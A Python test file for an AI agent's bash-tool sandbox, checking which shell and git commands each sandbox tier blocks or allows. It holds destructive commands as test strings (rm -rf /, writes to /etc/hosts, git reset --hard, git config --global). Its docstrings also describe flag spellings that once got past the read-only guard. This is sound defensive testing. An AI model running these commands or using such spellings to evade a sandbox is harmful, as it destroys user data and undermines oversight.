"""Tests for the bash tool sandbox (rant 2026-08-20T15:46:50).

Covers the static file-level isolation check: three tiers
(danger-full-access / read-only / workspace-write), protected daemon state
files, honest enforcement reporting (full/partial), and blocked-result
feedback through execute().
"""

import asyncio
import os
import subprocess
import sys
import tempfile

import pytest

from emrg.tools import bash_tool
from emrg.tools.bash_tool import (
    BashTool,
    SANDBOX_MODES,
    _check_sandbox,
    _extract_write_targets,
    _fully_quoted_token_indexes,
    _is_fd_operand,
    _is_redirect_operator,
    _split_command_tokens,
    _flag_part,
    _git_positionals,
    _GIT_CONFIG_VALUE_OPTS,
    _GIT_READ_VERBS,
    _GIT_SHAPE_DECIDED,
    check_workspace_write,
)


def _run(coro):
    return asyncio.run(coro)


# ── constant ──────────────────────────────────────────────────────────────

def test_sandbox_modes_constant():
    assert SANDBOX_MODES == ("danger-full-access", "read-only", "workspace-write")


# ── _extract_write_targets ────────────────────────────────────────────────

def test_extract_rm_rf_target():
    assert _extract_write_targets("rm -rf /tmp/x") == ["/tmp/x"]
    assert _extract_write_targets("rm -r ./build") == ["./build"]
    assert _extract_write_targets("rm -rf /tmp/a; echo hi") == ["/tmp/a"]


def test_extract_rmdir_target():
    assert _extract_write_targets("rmdir /tmp/empty") == ["/tmp/empty"]


def test_extract_mv_destination():
    assert _extract_write_targets("mv /tmp/a /tmp/b") == ["/tmp/b"]


def test_extract_cp_r_destination():
    assert _extract_write_targets("cp -r src /tmp/dst") == ["/tmp/dst"]
    assert _extract_write_targets("cp -R ./a ./b") == ["./b"]


def test_extract_redirect_targets():
    assert _extract_write_targets("echo x > /tmp/y") == ["/tmp/y"]
    assert _extract_write_targets("echo x >> /tmp/y") == ["/tmp/y"]
    assert _extract_write_targets("cmd 2> err.txt") == ["err.txt"]
    assert _extract_write_targets("echo x > /dev/null") == ["/dev/null"]
    # 2>&1 is not a file redirect — must not be captured
    assert "&1" not in _extract_write_targets("echo x > /tmp/y 2>&1")


def test_extract_no_targets_for_plain_reads():
    assert _extract_write_targets("ls -la") == []
    assert _extract_write_targets("git status") == []
    assert _extract_write_targets("echo hello") == []


# ── _check_sandbox — danger-full-access ───────────────────────────────────

def test_check_danger_full_access_always_allowed():
    allowed, reason, enforcement = _check_sandbox("rm -rf /", "danger-full-access")
    assert allowed is True
    assert reason is None
    assert enforcement == "full"


def test_check_invalid_mode_blocked():
    allowed, reason, enforcement = _check_sandbox("echo hi", "sandboxed")
    assert allowed is False
    assert "invalid sandbox mode" in reason
    assert enforcement == "partial"


# ── _check_sandbox — read-only ────────────────────────────────────────────

def test_check_read_only_blocks_destructive_commands():
    for cmd in ("rm -rf /tmp/x", "rmdir /tmp/empty", "mv /tmp/a /tmp/b",
                "cp -r src /tmp/dst"):
        allowed, reason, enforcement = _check_sandbox(cmd, "read-only")
        assert allowed is False, cmd
        assert "read-only sandbox" in reason
        assert enforcement == "partial"


def test_check_read_only_blocks_redirects():
    allowed, _, _ = _check_sandbox("echo x > /tmp/y", "read-only")
    assert allowed is False
    allowed, _, _ = _check_sandbox("echo x >> /tmp/y", "read-only")
    assert allowed is False


def test_check_read_only_allows_dev_null_redirect():
    allowed, _, _ = _check_sandbox("echo hi > /dev/null", "read-only")
    assert allowed is True


def test_check_read_only_allows_read_commands():
    for cmd in ("ls -la", "git status", "cat file.txt", "pwd", "echo hi",
                "git stash list", "git stash show -p",
                "git stash show stash@{0}", "git stash list | grep foo",
                "git worktree list", "git worktree list --porcelain",
                "git submodule status", "git submodule status | head"):
        allowed, _, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, cmd


def test_check_read_only_blocks_git_mutators():
    """Community issue #979: read-only must block git mutating commands —
    the 2026-08-20 data-loss killers (stash / checkout . / reset --hard /
    clean) escaped the rm/mv/cp target scan. Under read-only they must be
    structurally impossible, not merely discouraged by a prompt rule."""
    for cmd in (
        "git stash",
        "git stash list && git stash drop",
        "git stash push -m wip",
        "git stash drop stash@{0}",
        "git stash pop",
        "git stash clear",
        "git checkout .",
        "git checkout -- src/main.py",
        "git restore .",
        "git clean -fd",
        "git reset --hard",
        "git reset --mixed HEAD~1",
        "git commit -m 'wip'",
        "git push origin master",
        "git pull --rebase",
        "git merge master",
        "git rebase master",
        "git cherry-pick abc123",
        "git revert abc123",
        "git rm foo.py",
        "git switch feature/x",
        "git branch -d old",
        "git branch -D old",
        "git tag -d v1",
        # working-tree writers (cycle 20260825-193548)
        "git apply patch.diff",
        "git am patch-series.mbox",
        "git archive --output=tree.tar HEAD",
        "git submodule update --init",
        "git worktree add ../wt master",
        # worktree/submodule MUTATORS stay blocked (cycle 20260825-200038)
        "git worktree remove ../wt",
        "git worktree move ../wt ../wt2",
        "git worktree prune",
        "git worktree lock ../wt",
        "git worktree unlock ../wt",
        "git submodule add https://example.com/repo.git sub",
        "git submodule deinit -f .",
        "git submodule sync",
        "git worktree list && git worktree remove ../wt",
        "git submodule status; git submodule update",
    ):
        allowed, reason, enforcement = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} should be blocked"
        assert "read-only sandbox" in reason, cmd
        # Either the git-verb guard or the write-target scan may fire first
        # (`git rm foo.py` now names the removed path, not the verb) — both
        # are legitimate blocks; what must hold is that it *is* blocked.
        assert "git" in reason or "destructive write" in reason, cmd
        assert enforcement == "partial"


def test_check_read_only_blocks_git_mv():
    """`git mv a b` is blocked by the write-target scan (mv destination) —
    the git-mutator reason isn't required, the block is what matters."""
    allowed, reason, _ = _check_sandbox("git mv a b", "read-only")
    assert allowed is False
    assert "read-only sandbox" in reason


def test_flag_part_is_the_flag_and_not_the_spelling():
    """The helper the git flag tables are asked about, pinned case by case.

    A flag table holds a *flag*; a shell token may carry its value. Asking the
    table about the token decides by spelling, which is how three spellings of
    one write got two verdicts (issue #1238's family, measured 2026-09-16).
    """
    assert _flag_part("--set-upstream-to=origin/main") == "--set-upstream-to"
    assert _flag_part("-uorigin/main") == "-u"
    assert _flag_part("--sort=-committerdate") == "--sort"
    assert _flag_part("-vv") == "-v"
    # Things that are not flags keep every character: a lone `-` is a filename,
    # `--` is the argument terminator, and a path or pattern is not a flag.
    assert _flag_part("-") == "-"
    assert _flag_part("--") == "--"
    assert _flag_part("origin/main") == "origin/main"
    assert _flag_part("v1.2.3") == "v1.2.3"


def test_check_read_only_blocks_attached_value_git_write_flags():
    """A write flag whose value is attached is the same write.

    Measured 2026-09-16 against master: each of these was ALLOWED under
    read-only and, executed in a real repository with a real upstream, really
    did write — the branch's upstream in `.git/config` went from `origin/main`
    to `origin/old`. Their two-token twins (`--set-upstream-to origin/main`,
    `-u origin/main`) were already blocked, so the guard was deciding by
    spelling. This test pins the flag comparison itself.
    """
    for cmd in (
        "git branch --set-upstream-to=origin/main",
        "git branch -uorigin/main",
        # Spellings git itself refuses (rc=129) are blocked too. That is the
        # harmless direction, and it is pinned so a later reader does not
        # "fix" the truncation into an exemption.
        "git branch -dold",
        "git branch -Dold",
        "git branch --delete=old",
        "git tag -dv1",
        "git tag --delete=v1",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} should be blocked (got {reason!r})"
        assert "read-only sandbox" in reason
        assert "git" in reason, cmd


def test_check_read_only_blocks_unset_upstream():
    """The flag that takes no argument at all, so no positional rule sees it.

    Measured 2026-09-16 against master: `git branch --unset-upstream` was
    ALLOWED under read-only and really did clear the branch's upstream. It is a
    separate mechanism from the attached-value case above — no spelling is
    involved, the flag was simply absent from the table — so it fails on its
    own if only that entry is removed.
    """
    allowed, reason, _ = _check_sandbox("git branch --unset-upstream", "read-only")
    assert allowed is False, f"got {reason!r}"
    assert "read-only sandbox" in reason
    assert "git" in reason


def test_check_read_only_still_allows_git_branch_and_tag_reads():
    """The other direction: widening the flag tests must not eat the reads.

    `--set-upstream-to` is a write; `--sort` in the same attached-value shape is
    a read. Both go through `_flag_part`, so both are pinned here — a fix that
    blocks the listing forms would be a usability regression with no safety
    gain, which is what the read-only tier's own docstring warns about.
    """
    for cmd in (
        "git branch",
        "git branch -a",
        "git branch -vv",
        "git branch --show-current",
        "git branch --contains HEAD",
        "git branch --sort=-committerdate",
        "git branch --list 'feat/*'",
        "git tag",
        "git tag -l",
        "git tag --list",
        "git tag -n",
        "git tag --points-at HEAD",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} should be allowed (got {reason!r})"


def test_check_read_only_allows_git_reads():
    """Read-only keeps read-only git reads available — the read-only cycle
    still needs status/fetch/log/diff for scanning and review."""
    for cmd in (
        "git status --short --branch",
        "git fetch origin master",
        "git log --oneline -3",
        "git diff",
        "git diff --cached",
        "git show HEAD --stat",
        "git branch -a",
        "git remote -v",
        "git rev-parse --abbrev-ref HEAD",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} should be allowed (got {reason!r})"


def test_check_workspace_write_allows_git_mutators():
    """workspace-write is the normal working tier — tasks must still be able
    to commit/push there. Only read-only blocks git mutation."""
    for cmd in ("git stash", "git checkout .", "git reset --hard",
                "git commit -m x", "git push origin master"):
        allowed, _, _ = _check_sandbox(cmd, "workspace-write")
        assert allowed is True, cmd


# ── _check_sandbox — workspace-write ──────────────────────────────────────

def test_check_workspace_write_allows_relative_writes():
    # Relative targets are assumed in-workspace (cwd = workspace root).
    allowed, _, _ = _check_sandbox("echo x > out.txt", "workspace-write")
    assert allowed is True
    allowed, _, _ = _check_sandbox("rm -rf ./build", "workspace-write")
    assert allowed is True


def test_check_workspace_write_allows_temp_and_workspace_abs():
    allowed, _, _ = _check_sandbox(f"echo x > {tempfile.gettempdir()}/y", "workspace-write")
    assert allowed is True
    allowed, _, _ = _check_sandbox(
        "echo x > /workspace/out.txt", "workspace-write", workdir="/workspace"
    )
    assert allowed is True


def test_check_workspace_write_blocks_protected_daemon_file():
    allowed, reason, enforcement = _check_sandbox(
        "echo x > ~/.emrg/config.toml", "workspace-write"
    )
    assert allowed is False
    assert "protected" in reason
    assert enforcement == "partial"


def test_check_workspace_write_blocks_emrg_home_rm():
    allowed, reason, _ = _check_sandbox("rm -rf ~/.emrg", "workspace-write")
    assert allowed is False
    assert "daemon's data directory" in reason


def test_check_workspace_write_blocks_outside_workspace():
    allowed, _, _ = _check_sandbox(
        "rm -rf /etc/hosts", "workspace-write", workdir="/workspace"
    )
    assert allowed is False
    allowed, _, _ = _check_sandbox(
        "echo x > /etc/hosts", "workspace-write", workdir="/workspace"
    )
    assert allowed is False


# ── workspace-write: a `git config` write names the file it writes ─────────
# Measured on master `0ff41174aaceb978` with git 2.50.1: every command in
# `GIT_CONFIG_WRITES` was ALLOWED at workspace-write with an **empty** target
# list, and git really created the named file each time. The contract asserted
# below is the one `test_check_workspace_write_blocks_outside_workspace` already
# states for a redirect — a `git config` operand reaches the same boundary with
# no redirect anywhere in the command, which is why no redirect rule could see it.

GIT_OUTSIDE = "/outside/emrg.ini"

GIT_CONFIG_WRITES = (
    f"git config --file {GIT_OUTSIDE} a.b c",
    f"git config --file={GIT_OUTSIDE} a.b c",
    f"git config -f {GIT_OUTSIDE} a.b c",
    f"git config -f{GIT_OUTSIDE} a.b c",
    "git config --global user.name probe",
    "git config --system a.b c",
    f"git -c x=1 config --file {GIT_OUTSIDE} a.b c",
    f"git config --add --file {GIT_OUTSIDE} a.b c",
    f"env git config --file {GIT_OUTSIDE} a.b c",
    f"git config --file {GIT_OUTSIDE} a.b c && git status",
    f"sh -c 'git config --file {GIT_OUTSIDE} a.b c'",
)


def test_workspace_write_blocks_a_git_config_write_that_leaves_the_workspace():
    """`git config`'s file is an *operand*, so only naming it can block it.

    `--file`/`-f` writes exactly the path it is given, and `--global`/`--system`
    writes a config no workspace contains. The walk named a target for neither,
    and workspace-write allows a command whose target list is empty — so the
    boundary was reachable by a spelling the guard never read. The wrappers
    (`env`, `sh -c`) and the chained form are here because a rule that fired only
    on a bare `git config` would be a rule about *position*, which is the defect
    #1156 already fixed one level down.
    """
    for cmd in GIT_CONFIG_WRITES:
        allowed, reason, _ = _check_sandbox(cmd, "workspace-write", workdir="/workspace")
        assert allowed is False, f"{cmd!r} writes outside the workspace"


def test_the_git_config_block_names_the_file_git_writes():
    """Which path the refusal names, so it is a finding and not just a no.

    `--global` / `--system` are named by the file git writes by default
    (`~/.gitconfig`, `/etc/gitconfig`). `GIT_CONFIG_GLOBAL`, `XDG_CONFIG_HOME` and
    a build prefix move that file — never into a workspace — so the verdict this
    feeds is the same one under every spelling.
    """
    cases = {
        f"git config --file {GIT_OUTSIDE} a.b c": [GIT_OUTSIDE],
        f"git config --file={GIT_OUTSIDE} a.b c": [GIT_OUTSIDE],
        f"git config -f {GIT_OUTSIDE} a.b c": [GIT_OUTSIDE],
        f"git config -f{GIT_OUTSIDE} a.b c": [GIT_OUTSIDE],
        "git config --global --add a.b c": ["~/.gitconfig"],
        "git config --system a.b c": ["/etc/gitconfig"],
        # A flag is never a file *name*: naming `--global` here would put a flag
        # in the refusal — the same "an operator is never a target" discipline
        # the redirect walk applies to a quoted `>` (issue #1268).
        "git config --file --global a.b c": [],
        "git config --file= a.b c": [],
    }
    for cmd, want in cases.items():
        assert _extract_write_targets(cmd) == want, cmd


def test_a_git_config_read_names_no_target_and_stays_allowed():
    """The blocking direction must not swallow the reads.

    `git config --global --get user.name` is the identity check every cycle is
    told to run, and `git config --file <p> --get k` reads a file it must not be
    refused for *reading*. Both are proven reads, so they name no write target —
    a rule that blocked `--global` by itself would refuse them both.
    """
    for cmd in (
        "git config --global --get user.name",
        "git config --global --list",
        f"git config --file {GIT_OUTSIDE} --get a.b",
        "git config --get user.name",
        "git config -l",
    ):
        assert _extract_write_targets(cmd) == [], cmd
        allowed, reason, _ = _check_sandbox(cmd, "workspace-write", workdir="/workspace")
        assert allowed is True, f"{cmd!r} must stay allowed (got {reason!r})"


def test_a_config_option_value_is_never_a_positional_key():
    """`--file <p>` and its siblings take a separate value; the count read it as a key.

    Issue #1273 row 3, and the three spellings the same walk decides: measured
    with git 2.50.1 in a scratch repo, watching every file under it for a byte
    change, each of these **reads** — `--file <p> user.name` rc=1, `--type int
    user.name` rc=1, `--default fallback user.name` rc=0 — and none touched a
    file. The walk left the option's value among the positionals, so the count
    saw two of them and reported the write the spelling is one token away from;
    at read-only it was refused outright, and at workspace-write the file the
    option names was named as a target and refused as outside the workspace.

    The value is not a positional *by definition*, which is why this needs no
    heuristic: it is the same defect `_GIT_SUBCOMMAND_WITH_VALUE` was introduced
    for one level up (`git reflog -n 5`, issue #1240).
    """
    for cmd in (
        f"git config --file {GIT_OUTSIDE} user.name",
        f"git config -f {GIT_OUTSIDE} user.name",
        f"git config --file {GIT_OUTSIDE} --type int user.name",
        "git config --type int user.name",
        "git config --default fallback user.name",
    ):
        assert _extract_write_targets(cmd) == [], cmd
        for mode in ("read-only", "workspace-write"):
            allowed, reason, _ = _check_sandbox(cmd, mode, workdir="/workspace")
            assert allowed is True, f"{cmd!r} reads, at {mode} (got {reason!r})"


def test_the_value_skip_does_not_move_a_write_to_the_read_side():
    """The direction that decides whether the fix is a fix: the writes still block.

    A value is skipped, not the *key and the value*: the spelling that adds a
    value still leaves two positionals, and it really writes (`--file <p> a.b c`
    changed the file, rc=0). The `--type` / `--comment` forms are asserted at
    read-only, which is where a config mutator is decided; `--comment note a.b c`
    really did write `.git/config` when measured.
    """
    for cmd in (
        f"git config --file {GIT_OUTSIDE} a.b c",
        f"git config --file {GIT_OUTSIDE} a.b c d",
        f"git config -f {GIT_OUTSIDE} a.b c",
        "git config --type int a.b c",
        "git config --comment note a.b c",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only", workdir="/workspace")
        assert allowed is False, f"{cmd!r} writes (got {reason!r})"
    # and the file operand is still the target the refusal names
    assert _extract_write_targets(f"git config --file {GIT_OUTSIDE} a.b c") == [GIT_OUTSIDE]


def test_the_value_skip_is_scoped_to_the_config_verb():
    """`--file` takes a value for `config`; the shared walk must not learn that.

    Every other verb's positionals are still counted by the shared set, and
    measured over a generated corpus of 960 spellings across 40 other verbs the
    fix changed **no** verdict at either tier — this asserts the structural half
    of that: the same token list walks differently with and without the config set.
    """
    assert _git_positionals(["--file", "/p", "list"]) == ["/p", "list"]
    assert _git_positionals(["--file", "/p", "list"], _GIT_CONFIG_VALUE_OPTS) == ["list"]
    assert _git_positionals(["-n", "5"]) == []


#: The value the probe hands `--blob`: a real object id, but one that only exists
#: inside the scratch repository the probe runs in, so `changed_by` hashes it there
#: (`place_blob`). A placeholder rather than an id hashed somewhere else, because an
#: object from another repository makes the probe **refuse** to run (`unable to load
#: config blob object`) — and a refused command changes no bytes, which is the very
#: false pass this file exists to close.
_BLOB_PLACEHOLDER = "<a real object id, hashed into the probe's own repository>"

#: A value of the kind each member of `_GIT_CONFIG_VALUE_OPTS` takes, so the probe
#: below can hand it one. This is a *table*, not a second copy of the set: the test
#: asserts the two agree, so a member added without a probe value fails as an
#: unmeasured claim rather than passing quietly — which is the point, because the
#: set's safety rests entirely on the property the probe measures.
_GIT_CONFIG_PROBE_VALUE = {
    "--file": "probe.cfg",
    "-f": "probe.cfg",
    "--blob": _BLOB_PLACEHOLDER,
    "--type": "bool",
    "--default": "fallback",
    "--comment": "note",
}


def test_every_config_value_option_consumes_its_value(tmp_path):
    """The set's safety rests on one property, so measure it rather than assert it.

    Issue #1291. `_GIT_CONFIG_VALUE_OPTS` decides a **verdict**, not a subcommand:
    the walk skips an option *and its value*, and the count of what remains decides
    read vs write. Every member must therefore really take a separate value — and
    nothing in the tree measured that. Adding a value-less option swallows a genuine
    positional, and the count then reads a write as a read: measured with git
    2.50.1, `git config --no-type a.b c` writes `.git/config` (rc=0), and so do
    `--show-scope`, `--local`, `--worktree`, `--includes`, `--no-includes`,
    `--show-names` and `--null`. On the shipped set every one of those spellings is
    refused, so the exposure was entirely in the membership — and the suite stayed
    at `136 passed` with two of them added.

    **Arm 1 is the property itself, asked of git directly**: `git config <member>`
    with nothing after it. An option that takes a separate value is reported as
    `error: option `file' requires a value` (`switch `f' requires a value` for the
    short form); a value-less one runs on and reports `error: no action specified`,
    and one git does not know reports `error: unknown option`. Real git answers, no
    probe value is involved, and the answer does not depend on the shape this walk
    counts — which is exactly what the first revision of this test lacked. Its arm
    was `git config <member> <value> probe.key` asserting only that no bytes
    changed, and **a refused command changes no bytes either**: with `--local`
    added to the set and `"--local": "true"` to the table, that arm was green (its
    two assertions re-measured here — `git config --local true probe.key` exits 2
    with `error: key does not contain a section: true`, writing nothing, and that
    message does not contain the substring it looked for; the probe value has to
    contain a dot for the arm to catch a value-less member, and `bool`, `fallback`
    and `note` do not), while this arm reports `error: no action specified` for it
    and fails.

    **Arm 2 then checks that the counted shape really is a read**: per member,
    `git config <member> <value> probe.key` in its own scratch repository, with
    every byte under it compared. On its own it does not mean "git accepted the
    command" — arm 1 is what licenses reading "no bytes changed" as a read.
    `--blob`'s object is hashed *into the repository the probe runs in* for that
    reason: hashed elsewhere, the probe exits 1 with `unable to load config blob
    object` and the arm passed as a refusal rather than as a read.

    One member is refused by git in arm 2's shape and stays in the set anyway:
    `--comment` exits 129 with `--comment is only applicable to add/set/replace
    operations` for a bare read. It takes a value (arm 1 says so), and its
    membership is verdict-neutral in the write direction — measured,
    `git config --comment note probe.key v` writes `.git/config` and is refused
    with the member (two positionals) and without it (three). Arm 1 is the standard
    and `--comment` meets it; the earlier revision instead asserted that every
    member is accepted *in the counted shape*, which `--comment` is not — a claim
    narrower than the instrument (`"unknown option" not in stderr`) that was meant
    to enforce it, and green for the member it was aimed at (issue #1291).
    """
    import subprocess as sp

    assert set(_GIT_CONFIG_PROBE_VALUE) == set(_GIT_CONFIG_VALUE_OPTS), (
        "a member of _GIT_CONFIG_VALUE_OPTS has no probe value — add a value of the "
        "kind it takes (and re-measure that it consumes one) before the set grows; "
        "test_every_config_value_option_consumes_its_value is that measurement"
    )

    def scratch(name):
        repo = tmp_path / name
        repo.mkdir()
        env = dict(os.environ)
        # The machine's own config must not be able to make this pass or fail.
        env.update(GIT_CONFIG_GLOBAL=str(repo / "global.cfg"),
                   GIT_CONFIG_SYSTEM=str(repo / "system.cfg"),
                   GIT_CONFIG_NOSYSTEM="1", HOME=str(repo))
        sp.run(["git", "init", "-q"], cwd=repo, env=env, capture_output=True, check=True)
        return repo, env

    def slug(opt):
        return opt.strip("-").replace("-", "_")

    # --- Arm 1: git's own answer about arity, with no value and no positional ---
    for opt in sorted(_GIT_CONFIG_VALUE_OPTS):
        repo, env = scratch(f"arity-{slug(opt)}")
        proc = sp.run(["git", "config", opt], cwd=repo, env=env, capture_output=True)
        stderr = proc.stderr.decode(errors="replace")
        assert "requires a value" in stderr and opt.lstrip("-") in stderr, (
            f"`git config {opt}` with nothing after it did not report that this "
            f"member requires a value (stderr {stderr.strip()!r}). A member that "
            "takes none swallows a genuine positional and the count then reads a "
            "write as a read; a member git does not know is inert, and inert "
            "protects nothing. Re-measure the rule (issue #1291) and drop the "
            "member rather than widening this assertion"
        )

    def snapshot(root):
        # Keys are POSIX-joined on every platform. A Windows run hands back
        # `.git\\config` for `str(p.relative_to(root))`, so the expected
        # `[".git/config"]` below would fail on the separator alone, and the
        # `logs/` filter in `changed_by` would stop matching — both while the
        # byte watch itself answers exactly the same question (Windows CI,
        # 2026-09-16).
        return {p.relative_to(root).as_posix(): p.read_bytes()
                for p in sorted(root.rglob("*")) if p.is_file()}

    def changed_by(name, argv, resolve=None):
        """Run git in a fresh scratch repo; return what changed and what really ran.

        `resolve(repo, env, argv)` may fill in a value that only exists inside that
        repository (`--blob`'s object id). The argv it returns is handed back to the
        caller, because that — not the template — is the command that really ran.
        """
        repo, env = scratch(name)
        if resolve is not None:
            argv = resolve(repo, env, argv)
        before = snapshot(repo)
        proc = sp.run(["git", *argv], cwd=repo, env=env, capture_output=True)
        after = snapshot(repo)
        changed = sorted(k for k in set(before) | set(after)
                         if before.get(k) != after.get(k))
        return [c for c in changed if not c.startswith("logs/")], proc, argv

    def place_blob(repo, env, argv):
        """Hash `--blob`'s object into the repository the probe is about to run in."""
        blob = sp.run(["git", "hash-object", "-w", "--stdin"], cwd=repo, env=env,
                      input=b"[user]\n\tname = probe\n", capture_output=True)
        oid = blob.stdout.decode().strip()
        assert oid, "could not create the object `--blob` needs"
        return [oid if a == _BLOB_PLACEHOLDER else a for a in argv]

    # The watch has to be able to see a write, or "nothing changed" proves nothing.
    control, _, _ = changed_by("control", ["config", "probe.key", "probe.value"])
    assert control == [".git/config"], (
        "the byte watch did not see a plain `git config k v` write — re-measure the "
        f"rule before trusting any 'read' it reports (got {control!r})"
    )

    for opt, value in sorted(_GIT_CONFIG_PROBE_VALUE.items()):
        argv = ["config", opt, value, "probe.key"]
        changed, _, argv = changed_by(f"probe-{slug(opt)}", argv,
                                      place_blob if opt == "--blob" else None)
        assert changed == [], (
            f"`git {' '.join(argv)}` wrote {changed!r} — {opt} does not consume its "
            "value, so the walk miscounts every spelling that uses it (issue #1291: "
            "re-measure the rule and drop the member). Note that arm 1 above is what "
            "makes this arm mean 'a read': a command git *refuses* changes no bytes "
            "either"
        )
        # …and the walk settles this spelling as a read, so read-only must allow it.
        # That is the half the fix bought (issue #1273 row 3), and it is asserted
        # per member rather than per spelling alone. Allowing a spelling git itself
        # refuses (`--comment`, measured in the docstring) is harmless: it writes
        # nothing.
        cmd = "git " + " ".join(argv)
        allowed, reason, _ = _check_sandbox(cmd, "read-only", workdir=str(tmp_path))
        assert allowed is True, f"{opt}: reads, so read-only must allow it (got {reason!r})"


def test_git_config_writes_that_stay_inside_the_workspace_stay_allowed():
    """The positive control: an in-workspace `git config` write is ordinary work.

    `git config user.name x` writes the repo's own `.git/config`, and `--file`
    pointed inside the workspace or the temp root is the same operation spelled
    with a path. Refusing either would break the identity check and every
    `--file` use inside a repo — a boundary defended by refusing the write that
    is inside it is not a boundary.
    """
    for cmd in (
        "git config user.name probe",
        "git config core.hooksPath .githooks",
        "git config --file ./local.ini a.b c",
        f"git config --file {tempfile.gettempdir()}/emrg.ini a.b c",
        "git status",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "workspace-write", workdir="/workspace")
        assert allowed is True, f"{cmd!r} must stay allowed (got {reason!r})"


def test_only_a_config_invocation_names_a_git_config_file():
    """`-f` is a *file* flag for `config` alone.

    For `branch` / `tag` / `push` the same spelling is `--force`, which names no
    file — reading it as one for every verb would point the block at a name that
    is not a path, and refuse ordinary work with it. The last two are the
    valueless spellings: they must not read the flag itself as the file name.
    """
    for cmd in (
        "git tag -f v1",
        "git branch -f other",
        "git push -f origin master",
        "git config --file",
        "git config --global",
    ):
        assert _extract_write_targets(cmd) == [], cmd
    for cmd in ("git tag -f v1", "git branch -f other", "git push -f origin master"):
        allowed, _, _ = _check_sandbox(cmd, "workspace-write", workdir="/workspace")
        assert allowed is True, cmd


# ── workspace-write trusted zone (issue #1093 self-regression) ─────────────
# PR #1092 added check_workspace_write to write/edit (mirroring bash) and
# blocked absolute targets outside the injected workspace. The evolution task
# runs at workspace-write with workspace = the repo checkout, but writes its
# own cycle records to ~/.emrg/evolution/.emrg/memory/* — which is OUTSIDE that
# workspace. That was a self-regression (the evolution module couldn't record
# its own history). The fix trusts ~/.emrg/evolution/.emrg as a write zone and
# normalizes the OS-temp root for the Temp\<suffix> discrepancy. Both positive
# and negative states must be verified.


def test_workspace_write_allows_evolution_memory(monkeypatch, tmp_path):
    """write/edit/bash may target ~/.emrg/evolution/.emrg/memory (the evolution
    module's own data root) even though it is outside the repo workspace."""
    import emrg.tools.bash_tool as bt
    # Pin the user home + evolution data root so the test is hermetic and does
    # not depend on this host's real ~/.emrg layout.
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    # Recompute the trusted zone against the pinned HOME.
    evo_data = os.path.realpath(os.path.expanduser("~/.emrg/evolution/.emrg"))
    ws = str(tmp_path / "ws")
    # check_workspace_write (write/edit tools)
    meta = evo_data + "/memory/cycle-20260901-000000.md"
    assert check_workspace_write(meta, ws) is None
    # bash _check_sandbox (redirect to memory index)
    allowed, reason, _ = _check_sandbox(
        f"echo x > {evo_data}/memory/MEMORY.md", "workspace-write", ws
    )
    assert allowed is True, f"should allow evolution memory write (got {reason!r})"


def test_workspace_write_allows_evolution_session_scratch(monkeypatch, tmp_path):
    """The trusted evolution-data zone covers session scratch (sessions/) too,
    per the _trusted_write_zones() docstring — lock it in so a future narrowing
    of the zone to memory/ alone cannot silently break session writes."""
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    evo_data = os.path.realpath(os.path.expanduser("~/.emrg/evolution/.emrg"))
    ws = str(tmp_path / "ws")
    # check_workspace_write (write/edit tools)
    session = evo_data + "/sessions/emrg-evolution-emrg-task/history.jsonl"
    assert check_workspace_write(session, ws) is None
    # bash _check_sandbox (redirect to a session scratch file)
    allowed, reason, _ = _check_sandbox(
        f"echo x > {evo_data}/sessions/emrg-evolution-emrg-task/notes.txt",
        "workspace-write", ws,
    )
    assert allowed is True, f"should allow evolution session-scratch write (got {reason!r})"


def test_workspace_write_still_blocks_emrg_home(monkeypatch, tmp_path):
    """Even with the trusted evolution-data zone, ~/.emrg itself is still
    blocked from destructive write (the guard is not widened)."""
    check = check_workspace_write("~/.emrg", str(tmp_path / "ws"))
    assert check is not None
    assert "daemon's data directory" in check
    allowed, reason, _ = _check_sandbox("rm -rf ~/.emrg", "workspace-write", str(tmp_path / "ws"))
    assert allowed is False
    assert "daemon's data directory" in reason


def test_workspace_write_still_blocks_protected_file():
    """Protected daemon state files remain blocked regardless of the trusted
    evolution-data zone."""
    check = check_workspace_write("~/.emrg/config.toml", "/workspace")
    assert check is not None
    assert "protected daemon file" in check


def test_workspace_write_temp_root_normalized(monkeypatch):
    r"""Temp\<suffix> discrepancy (Windows): when gettempdir() returns a
    Temp\<suffix> path, the parent Temp root is also allowed so helpers written
    to the plain Temp root are not blocked."""
    import tempfile as _tf
    import emrg.tools.bash_tool as bt
    fake_suffix = "/fake/Temp/2"
    fake_parent = "/fake/Temp"
    monkeypatch.setattr(_tf, "gettempdir", lambda: fake_suffix)
    # _temp_write_roots must include both the suffix path and the parent Temp root.
    roots = bt._temp_write_roots()
    assert any(r == os.path.realpath(fake_suffix) for r in roots)
    assert any(r == os.path.realpath(fake_parent) for r in roots)
    # A write to the parent Temp root is not blocked.
    check = check_workspace_write("/fake/Temp/emrg_probe.py", "/workspace")
    assert check is None


# ── execute() integration ─────────────────────────────────────────────────

def test_execute_read_only_blocks_rm_rf(tmp_path):
    """read-only refuses a destructive command before the shell sees it.

    The victim is a directory THIS TEST creates (rant 2026-09-17T11:38:16): a
    negative test's safety must not rest on the guard it is testing, because a
    mutation arm breaks that guard on purpose. Then this test can only ever
    destroy its own scratch, and the surviving sentinel is what proves the
    command did not run.
    """
    victim = tmp_path / "emrg-sandbox-test"
    victim.mkdir()
    sentinel = victim / "sentinel.txt"
    sentinel.write_text("alive", encoding="utf-8")
    tool = BashTool()
    result = _run(tool.execute({
        "command": f"rm -rf {victim}",
        "sandbox": "read-only",
    }))
    assert result.error is True
    assert "sandbox" in result.content
    assert "not executed" in result.content
    assert sentinel.exists() and sentinel.read_text() == "alive"


def test_execute_workspace_write_blocks_a_write_outside_the_workspace(
    tmp_path, monkeypatch
):
    """execute() really consults the workspace-write boundary: a redirect to an
    absolute path outside the injected workspace is refused before the shell
    runs.

    Replaces the deleted `~/.emrg/config.toml` variant of this test (rant
    2026-09-17T11:38:16), keeping the end-to-end wiring coverage with a target
    the test builds itself — so the same mutation arm that kills the assertion
    writes nothing anywhere real, and `not target.exists()` proves it.

    gettempdir is patched because pytest's tmp_path sits inside the OS temp
    root, which workspace-write legitimately allows: without the patch the
